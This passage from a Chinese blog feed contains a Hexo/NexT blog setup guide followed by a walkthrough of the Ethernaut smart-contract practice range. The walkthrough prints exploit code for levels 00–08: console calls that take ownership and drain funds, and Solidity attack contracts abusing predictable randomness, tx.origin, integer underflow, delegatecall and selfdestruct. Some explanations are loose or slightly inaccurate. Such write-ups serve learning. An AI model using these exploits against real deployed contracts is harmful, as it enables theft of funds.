<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories: &#123;</span><br><span class="line">  - Geek tech: 安全弱相关技术</span><br><span class="line">  - Software analysis technology: 软件分析技术</span><br><span class="line">  - CTF_practice：CTF 比赛wp及日常题目</span><br><span class="line">  - CTF_Theory: CTF 中的理论知识</span><br><span class="line">  - IOT: 物联网相关技术</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="x0-说在前面">0x0 说在前面:</h1>
<blockquote>
<p>环境：Win11 参考资料：CodeSheep师傅在b站上的视频 &amp;
Next官方文档</p>
</blockquote>
<blockquote>
<p>在配置的过程中经常忘记自己配了什么，导致这篇博客可能不是很全，后续换电脑重配环境时再补充XD</p>
</blockquote>
<h1 id="x1-hexo初始化一个博客">0x1 Hexo初始化一个博客</h1>
<p>首先，我们需要在<a
href="https://nodejs.org/en/">Node.js官网</a>中下载nodejs</p>
<p>其次，在终端输入<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>
&gt;👆这一步其实可有可无，只不过换到淘宝镜像源以后cnpm的安装速度更快一些</p>
<p>输入<code>cnpm -install -g hexo-cli</code>安装hexo框架，这样hexo就安装好啦XD</p>
<hr />
<p>建立一个空文件夹，并在命令行按序输入<code>hexo init</code>,这样本地的博客就搭建好啦XD</p>
<p>打开自己的Github，创建一个新仓库，名字为<code>个人名称.github.io</code></p>
<p>在终端输入<code>cnpm install --save hexo-deployer-git</code>安装部署器</p>
<p>打开<strong><em>站点配置文件</em></strong>，修改Deployment下的配置
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:https://github.com/GithubName/GithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure></p>
<p>继续在空文件夹打开终端，输入<code>hexo g</code>和<code>hexo d</code>博客就能部署到远端啦XD</p>
<blockquote>
<p>这里我之前是配置过账户和密码的，所以没有弹出配置的问题，当时也是稀里糊涂就弄好了，导致现在不太清楚到底发生了什么，就没办法复盘，等后面换新电脑再说吧XD</p>
</blockquote>
<h1 id="x2-hexo-config-theme-config">0x2 Hexo config &amp; Theme
config</h1>
<p>我使用的这一个主题👇，这里具体讲讲博客的配置 <a
href="http://theme-next.iissnan.com/">NexT 使用文档 (iissnan.com)</a>
为了描述方便，在以下说明中： 将<strong><em>hexo
init生成的config文件</em></strong>称为<code>站点配置文件</code>
将<strong><em>theme的config文件</em></strong>称为<code>主题配置文件</code></p>
<hr />
<ul>
<li>配置主题 在hexo站点目录中用终端输入👇 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
打开<strong><em>站点配置文件</em></strong>，修改: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></li>
<li>个人偏好-<strong><em>主题配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure></li>
<li>站点图像-<strong><em>主题配置文件</em></strong>
修改之前记得在themes\next，图像尺寸要符合16x16和32x32 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: /images/favicon-16x16.png</span><br><span class="line">  medium: /images/favicon-32x32.png</span><br><span class="line">  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: /images/logo.svg</span><br><span class="line">  #android_manifest: /images/manifest.json</span><br><span class="line">  #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>社交链接-<strong><em>主题配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Social Links</span><br><span class="line"># Usage: `Key: permalink || icon`</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/HeyGap || fab fa-github</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>搜索:先在站点目录下安装<code>npm install hexo-generator-searchdb --save</code></li>
</ul>
<p><strong><em>站点配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<strong><em>主题配置文件</em></strong>：添加 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure></p>
<hr />
<ul>
<li>引用示例 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;</span><br><span class="line">靡不有初 鲜克有终</span><br><span class="line">&lt;p&gt;&lt;p&gt;</span><br><span class="line">&lt;br&gt;《诗经》</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
靡不有初 鲜克有终
<p>
<p>
<br>《诗经》
</blockquote></li>
</ul>
<hr />
<ul>
<li>更大更有吸引力的图片来源于<code>&lt;img src="/image-url" class="full-image" /&gt;</code></li>
</ul>
<hr />
<ul>
<li>Bootstrap Callout使用方式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<p>其中，<code>class_name</code> 可以是以下列表中的一个值：</p>
<div class="note default">
            <p>default</p>
          </div>
<div class="note primary">
            <p>primary</p>
          </div>
<div class="note success">
            <p>success</p>
          </div>
<div class="note info">
            <p>info</p>
          </div>
<div class="note warning">
            <p>warning</p>
          </div>
<div class="note danger">
            <p>danger</p>
          </div>
<hr />
<h1 id="x3-latex配置">0x3 LaTex配置</h1>
<blockquote>
<p>我这边pandoc总是出错，于是转用了kramed</p>
</blockquote>
<p>终端输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm uninstall hexo-renderer-marked --save</span><br><span class="line">cnpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
<p><strong><em>主题配置文件</em></strong></p>
<blockquote>
<p>为了加快渲染速度，per_page我选的true，如果嫌麻烦可以直接false</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (true) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in Front-matter.</span><br><span class="line">  # If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span><br><span class="line">  per_page: true</span><br><span class="line">  </span><br><span class="line">  # hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # See: https://mhchem.github.io/MathJax-mhchem/</span><br><span class="line">    mhchem: false</span><br></pre></td></tr></table></figure>
<p>记得在需要渲染的md加入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure></p>
<p>Test the <span class="math inline">\(X_{n-1}\)</span></p>
<blockquote>
<p>不过渲染后就导致写md时多了几个规矩</p>
<ol type="1">
<li>---的上下必须各空一格</li>
</ol>
</blockquote>
<p><a
href="https://www.luogu.com.cn/blog/over-knee-socks/latex-gong-shi-tai-quan-fixed">【公式】KaTeX
使用指南（洛谷特供） - 白色过膝袜 - 洛谷博客 (luogu.com.cn)</a></p>
<h1 id="x4-hexo-x-next-美化">0x4 Hexo x Next 美化</h1>
<ul>
<li>动态背景 在<strong><em>站点目录</em></strong>打开git，输入
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest</span><br></pre></td></tr></table></figure> 在<strong><em>主题配置文件</em></strong>中加入
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">canvas_nest: # 网络背景</span><br><span class="line">  enable: true</span><br><span class="line">  onmobile: true # display on mobile or not</span><br><span class="line">  color: &#x27;0,0,0&#x27; # RGB values, use &#x27;,&#x27; to separate</span><br><span class="line">  opacity: 0.5 # the opacity of line: 0~1</span><br><span class="line">  zIndex: -1 # z-index property of the background</span><br><span class="line">  count: 150 # the number of lines</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>记得把其他的动态背景关闭呀，比如</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">three:</span><br><span class="line">  enable: false</span><br><span class="line">  three_waves: false</span><br><span class="line">  canvas_lines: true</span><br><span class="line">  canvas_sphere: false</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br></pre></td></tr></table></figure>
<hr />
<ul>
<li>文章结尾
在路径 <code>\themes\next\layout\_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件,并添加以下内容：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------文章就到这里啦！&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读XD-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
接着打开<code>\themes\next\layout\_macro\post.swig</code>文件，在<code>post-body</code> 之后(<code>END POST BODY</code>)， <code>post-footer</code> 之前添加以下代码:
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt; </span><br><span class="line">	&#123;% if not is_index %&#125; </span><br><span class="line">		&#123;% include &#x27;passage-end-tag.swig&#x27; %&#125; </span><br><span class="line">	&#123;% endif %&#125; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
然后打开<strong><em>主题配置文件</em></strong>，在末尾添加：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passage_end_tag: </span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>贴一个<a href="https://fontawesome.dashgame.com/">图标库Font
Awesome)</a>，<strong><em>主题配置文件</em></strong>里的在线图标基本都要用到它</li>
</ul>
<hr />
<ul>
<li>代码块复制 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: night</span><br><span class="line">codeblock:</span><br><span class="line">  border_radius:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style: mac</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>回到顶部与阅读进度 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line">  # Back to top in sidebar.</span><br><span class="line">  sidebar: false</span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br><span class="line">  </span><br><span class="line"># Reading progress bar</span><br><span class="line">reading_progress:</span><br><span class="line">  enable: true</span><br><span class="line">  # Available values: top | bottom</span><br><span class="line">  position: top</span><br><span class="line">  color: &quot;#7B68EE&quot;</span><br><span class="line">  height: 3px</span><br></pre></td></tr></table></figure> 附一些参考资料XD~</li>
</ul>
<p><a
href="https://baike.baidu.com/item/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81#:~:text=%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BD%AF%E4%BB%B6%E4%B8%AD%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E5%9C%A8%E5%BE%88%E5%A4%9A%E8%BD%AF%E4%BB%B6%E4%B8%AD%EF%BC%8C%E9%83%BD%E4%BC%9A%E9%81%87%E5%88%B0%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%91%E5%B1%95%E6%9D%A5%E6%BA%90%20%E4%BA%BA%E7%9A%84%E7%9C%BC%E7%9D%9B%E7%9C%8B%E5%88%B0%E7%9A%84%E9%A2%9C%E8%89%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A,%E4%B8%80%E7%A7%8D%E6%98%AF%E5%8F%91%E5%85%89%E4%BD%93%E5%8F%91%E5%87%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%8C%E6%AF%94%E5%A6%82%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%99%A8%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%9B%20%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%98%AF%E7%89%A9%E4%BD%93%E6%9C%AC%E8%BA%AB%E4%B8%8D%E5%8F%91%E5%85%89%EF%BC%8C%E8%80%8C%E6%98%AF%E5%8F%8D%E5%B0%84%E7%9A%84%E5%85%89%E4%BA%A7%E7%94%9F%20%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E3%80%82">十六进制颜色码_百度百科
(baidu.com)</a></p>
<hr />
<ul>
<li>增加阅读次数/时长和访客数-<strong><em>主题配置文件</em></strong>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true  #是否开启不蒜子统计功能</span><br><span class="line">  total_visitors: true #是否统计总访客数</span><br><span class="line">  total_visitors_icon: user #访客数图标为人像</span><br><span class="line">  total_views: true #是否同级总访问数</span><br><span class="line">  total_views_icon: eye #访问数图标为眼睛</span><br><span class="line">  post_views: true #是否统计文章访问数</span><br><span class="line">  post_views_icon: eye #访问数图标为眼睛</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>链接样式
修改文件 <code>themes\next\source\css\_common\components\post\post.styl</code>，在末尾添加如下css样式：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #6A5ACD;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<p>参考文章👇</p>
<p><a href="https://www.mickeymiao.top/posts/f9b8ceb/">hexo
NexT主题美化总结 | MickeyMiao</a></p>
<p>深度美化-放着吃灰</p>
<p><a
href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">如何在Hexo中对文章md文件分类_貌似掉线的博客-CSDN博客</a>
<a href="https://zhuanlan.zhihu.com/p/64965187">使用 Hexo Hey
管理你的博客 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - Ethernaut智能合约漏洞靶场复现</title>
    <url>/2024/07/19/blockchain%20-%20Ethernaut%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
接到了链上的项目，正好学习一下
</blockquote>
<span id="more"></span>
<h1 id="x00-环境搭建">0x00 环境搭建</h1>
<p>我用的是<a
href="https://ethernaut.openzeppelin.com/">这个靶场</a>，需要下载MetaMask，下载完毕之后可以切换到Sepolia测试币，去<a
href="https://sepolia-faucet.pk910.de/">这里</a>开源挖币，就有测试币可以搭建Instance了(不过需要认证score，也很简单，只需要认证好github就能过)</p>
<h1 id="x01-题目">0x01 题目</h1>
<h2 id="hello-ethernaut">00 Hello Ethernaut</h2>
<p>这个题目完全是新手教程，让我们与contract的info这个method进行交互，我们打开控制台按照他的意思一直contract.xxx("xxx")就行了</p>
<h2 id="fallback">01 Fallback</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:fallback/receive 函数触发时机</p>
</blockquote>
<h3 id="basic">Basic</h3>
<p>这一关的名字是Fallback，fallback是一类函数，这类函数可以在合约接收到以太币时执行一些操作（Exploration里有更精确的定义）。本题中，当接收的币大于0并且币的发送方在发送这条消息之前已经对该合约有了贡献（发送过币），那就把这个合约的所有权移交给币的发送方。</p>
<p>也就是说，我们只需要 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure>
就已经将控制权掌握在我们手中了，此时就可以使用被onlyOwner这个modifier修饰的withdraw函数了
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()              <span class="comment">// 查看合约所有权</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)  <span class="comment">// 查看合约剩余余额</span></span><br></pre></td></tr></table></figure></p>
<h3 id="exploration">Exploration</h3>
<p>我很好奇按照上面的说法，contribute两次应该也可以吧，不用非得contribute一次再sendtransaction一次才能提权。后来我尝试了一下果然不行，因为contribute在合约里有明确定义，合约收到Ether之后会调用contribute里的逻辑去处理这个Ether。但sendTransaction属于向合约发起交易，并且没有附加数据(msg.data)，因此会隐式调用receive函数（也就是Fallback函数）进行逻辑处理。</p>
<p>因此本题fallback函数的调用条件是：当合约接收到代币但没有处理代币的函数，并且没有附加数据时，会调用fallback函数来处理。但我问了GPT老师，他的回答是这样的：</p>
<p>触发 fallback 函数的情况：</p>
<p>①调用不存在的函数：如果调用的函数在合约中不存在，且合约定义了
fallback 函数，则会触发 fallback 函数。</p>
<p>②发送以太币但没有数据，且没有定义 receive 函数：如果合约中没有定义
receive 函数，发送纯以太币且没有附加数据时，会触发 fallback 函数。</p>
<p>③发送以太币且有附加数据：如果发送以太币且附加了数据（即 msg.data
不为空），即使合约定义了 receive 函数，也会触发 fallback 函数。</p>
<p>exp如下 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0.000000000000000001&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0.000000000000000002&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x9a80a78bebE92EF9cDfC4CA116fC4925237fDbd0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x9a80a78bebE92EF9cDfC4CA116fC4925237fDbd0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>ps: 打这关的时候提交有的时候会显示不通过，但多submit几次就好了</p>
<h2 id="fallout">02 Fallout</h2>
<blockquote>
<p>漏洞类型：权限设置错误/关键函数拼写错误</p>
</blockquote>
<p>这题貌似是想告诉我们不要把构造函数公有化？因为只要调用这个Fal1out函数就能掌握所有权了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title class_">Fal1</span>out()</span><br></pre></td></tr></table></figure>
<h2 id="coin-flip">03 Coin Flip</h2>
<blockquote>
<p>漏洞类型：预测伪随机数</p>
</blockquote>
<blockquote>
<p>take-away msg:部分全局变量；伪随机数预测</p>
</blockquote>
<p>猜硬币，这种随机数肯定是伪随机数，可以预测的。</p>
<p>看合约源码得知blockValue是前一个区块的hash值，并将其转换为无符号整数。</p>
<p>如果lasthash值（上个区块的hash值）等于blockValue，就说明这个blockValue被用过了，调用revert函数返回gas。我们只能等新区块生成之后再预测（比特币10min生成一个区块，以太坊只需要15s）</p>
<p>如果lasthash等于blockValue，就用blockValue除以FACTOR得到一个结果coinFlip，我们要猜这个数字是1还是0。</p>
<p>源码分析完了，伪随机数是blockValue，由于我们已经知道了FACTOR，所以只要知道了blockValue就可以直到后面的全部内容，我们来分析一下为什么可以预测blockValue</p>
<p>当交易在链上被发送时，这些交易会被矿工打包到即将挖出的下一个区块中，区块包含多个交易，这些交易会顺序执行。在同一笔交易中，如果一个合约调用另一个合约，这些调用会在同一个区块中顺序执行。区块链的每个区块都有一个固定的时间窗（例如，比特币的每个区块时间为10分钟，以太坊的每个区块时间为15秒）。在这个时间窗内，所有被打包到这个区块中的交易会共享相同的区块哈希和区块编号。</p>
<p>因此，只要我们写一个攻击合约，在攻击合约中获取block.number，再调用被攻击合约的flip函数，那么flip中的block.number就跟攻击合约中的number是相同的了。因此也就达成了攻击的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address addr;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    event Result(bool, bool);</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">        addr = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip() external &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        (bool success, bytes memory data) = addr.call(abi.encodeWithSignature(&quot;flip(bool)&quot;, side));</span><br><span class="line">        emit Result(success, abi.decode(data, (bool)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="telephone">04 Telephone</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:直接调用者 &amp; 间接调用者</p>
</blockquote>
<p>本题主要考察 tx.origin 与 msg.sender 的区别，tx.orgin
指的是交易的发起方，msg.sender
指的是合约的直接调用者。比如，当用户X通过合约A调用合约B时：对于合约A，tx.origin
与 msg.sender 都是用户X；对于合约B，tx.origin 是用户X，msg.sender
是合约A</p>
<p>因此我们只需要部署一个合约A，通过该合约调用题目函数即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone constant private target = Telephone(0xdeE55F3707b4462D224A931cB6B2e2c619C9EFFB);</span><br><span class="line">    function call() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="token">05 Token</h2>
<blockquote>
<p>漏洞类型：整数溢出</p>
</blockquote>
<blockquote>
<p>take-away msg:整数溢出</p>
</blockquote>
<p>整数溢出。balances 和 value 都是 uint256
型的，所以减完了还是正数，由于初始余额有20，我们直接减21即可
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.<span class="property">address</span></span><br><span class="line"><span class="string">&#x27;0x440f5dD58996e284Bf339399cE48580cf2ADC84b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transfer</span>(<span class="string">&quot;0x440f5dD58996e284Bf339399cE48580cf2ADC84b&quot;</span>,<span class="number">21</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="delegation">06 Delegation</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:代理合约；delegatecall</p>
</blockquote>
<p>本题考察对合约调用方式的理解。合约调用共有三种方式</p>
<ul>
<li>call: 调用后内置变量 msg
的值会修改为调用者，执行环境为被调用者的运行环境</li>
<li>delegatecall: 调用后内置变量 msg
的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</li>
<li>callcode: 调用后内置变量 msg
的值会修改为调用者，但执行环境为调用者的运行环境 &gt; 貌似 "callcode"
已被弃用，取而代之的是 "delegatecall"</li>
</ul>
<p>也就是说，当我们以 call 的形式通过合约 Delegation 调用合约 Delegate
的 pwn 函数时，Delegate 中记录的 msg.sender 是 Delegation
的地址；而当我们以 Delegate call 的形式通过合约 Delegation 调用合约
Delegate 的 pwn 函数时，Delegate 中记录的 msg.sender
是我们自己的地址。</p>
<p>类比 Telephone 那道题，普通 call 的 msg.sender 就是 msg.sender，而
DelegateCall 的 msg.sender 是 tx.origin。</p>
<p>在本题中，合约 Deletation 部署了合约 Delegate，并且有 pwn
函数可以让我们提权，我们需要通过触发 fallback，通过传入的 data 调用
pwn()，即<code>await contract.sendTransaction(&#123;data:"0xdd365b8b"&#125;);</code>，至于为什么是
0xdd365b8b，这好像是 pwn()
函数的签名再哈希以后的前四字节，可以通过下面的 solidity 代码生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    bytes4 public result;</span><br><span class="line">    function test() public  &#123;</span><br><span class="line">        result = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以通过<code>await web3.utils.keccak256("pwn()")</code>生成</p>
<h2 id="force">07 Force</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:通过自毁函数强制转入eth</p>
</blockquote>
<p>本题给了空合约，旨在让我们学会如何在合约拒绝转入时强制给它转入
ETH</p>
<p>可以通过 selfdestruct() 函数来完成目标，这个合约析构函数有以下性质：
1. 指令执行后，合约将拒绝服务，地址对应的字节码将被标注为删除</p>
<ol start="2" type="1">
<li><p><strong>合约地址中所有的 ETH
将被发送到指定的新地址</strong></p></li>
<li><p>进行 ETH 转移时，即使目标地址为一个合约地址，也不会触发该地址的
fallback 函数，因此不需要该合约有任何的 payable 函数</p></li>
<li><p>如果 selfdestruct 函数被非预期执行，整个合约会拒绝服务</p></li>
</ol>
<p>也就是说我们可以写一个合约，让它析构的时候给要攻击的合约转入 1wei,在
remix 上部署以下合约即可，记得 value 设置成 1wei</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function forceAttack(address payable _addr) payable external &#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="vault">08 Vault</h2>
<blockquote>
<p>漏洞类型：隐私信息上链</p>
</blockquote>
<blockquote>
<p>take-away msg:不要把隐私信息上链，因为全公开</p>
</blockquote>
